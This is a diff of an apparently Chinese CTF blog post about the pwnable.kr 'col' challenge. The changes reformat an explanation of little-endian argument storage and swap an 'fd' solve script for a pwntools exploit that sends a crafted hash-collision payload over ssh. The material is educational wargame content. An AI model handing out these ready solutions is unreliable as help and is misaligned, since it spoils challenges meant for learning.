@@ -342,48 +342,9 @@ Last Remainder chunk：对small bin的malloc机制的介绍中当用户请求的
 <p>输入的argv[1]存储在栈上和内核空间之间，并且由低地址向高地址增长。</p>
 <p>那么就很容易明白为什么逆序输入int四个字节了。</p>
 <p>以为0x6C5CEC9和0x6C5CEC8为例  我们传入命令行参数argv[1]对应的字节序列为</p>
-<p>\xc9\xce\xc5\x06\x12\x34\x56\x78实际存储时如下方式存储如下</p>
-<table>
-<thead>
-<tr>
-<th>内存地址                                   存储的字节</th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>高地址8                                      78</td>
-<td></td>
-</tr>
-<tr>
-<td>高地址7                                      56</td>
-<td></td>
-</tr>
-<tr>
-<td>高地址6                                      34</td>
-<td></td>
-</tr>
-<tr>
-<td>高地址5                                      12</td>
-<td></td>
-</tr>
-<tr>
-<td>高地址4                                      06</td>
-<td></td>
-</tr>
-<tr>
-<td>高地址3                                      c5</td>
-<td></td>
-</tr>
-<tr>
-<td>高地址2                                      ce</td>
-<td></td>
-</tr>
-<tr>
-<td>高地址1                                      c9</td>
-<td></td>
-</tr>
-</tbody></table>
-<p>int型号指针ip指向高地址1    那么由于int型号为小端存储</p>
+<p>\xc9\xce\xc5\x06\x12\x34\x56\x78实际存储时如下方式存储如下：</p>
+<p>高地址8                                      78<br>高地址7                                      56<br>高地址6                                      34<br>高地址5                                      12<br>高地址4                                      06<br>高地址3                                      c5<br>高地址2                                      ce<br>高地址1                                      c9</p>
+<p>int型号指针ip指向高地址1    那么由于int型号为小端存储，四个字节依次读取</p>
 <p>ip[i]=0x06C5CEC9  ip[2]=0x78563412</p>
 <p>网上大部分解析只是简单说明int数据小端存储，但是单单知道这个是不足以得出逆序输入的结论，必须知道命令行参数存储结构。</p>
 <p><strong>以上内容原创。转载注明出处。</strong></p>
@@ -392,7 +353,7 @@ Last Remainder chunk：对small bin的malloc机制的介绍中当用户请求的
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">`python -c <span class="built_in">print</span> <span class="string">&#x27;\xAB\xCD&#x27;</span>`</span><br></pre></td></tr></table></figure>
 
 <p><strong>Exp:</strong></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">str</span>(<span class="number">0x1234</span>)</span><br><span class="line"></span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;fd&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line"><span class="comment">#shell.download_file(&#x27;fd.c&#x27;)</span></span><br><span class="line">sh = shell.run(<span class="string">&#x27;./fd&#x27;</span>+<span class="string">&#x27; &#x27;</span>+payload)</span><br><span class="line">payload=<span class="string">&quot;LETMEWIN&quot;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload=p32(<span class="number">0x6c5cec9</span>)*<span class="number">4</span>+p32(<span class="number">0x6c5cec8</span>)</span><br><span class="line"></span><br><span class="line">shell=ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;col&#x27;</span>,password=<span class="string">&#x27;guest&#x27;</span>,port=<span class="number">2222</span>)</span><br><span class="line"><span class="comment">#shell.download_file(&#x27;col.c&#x27;)</span></span><br><span class="line">sh = shell.run(<span class="string">&#x27;./col&#x27;</span>+<span class="string">&#x27; &#x27;</span>+payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 
 
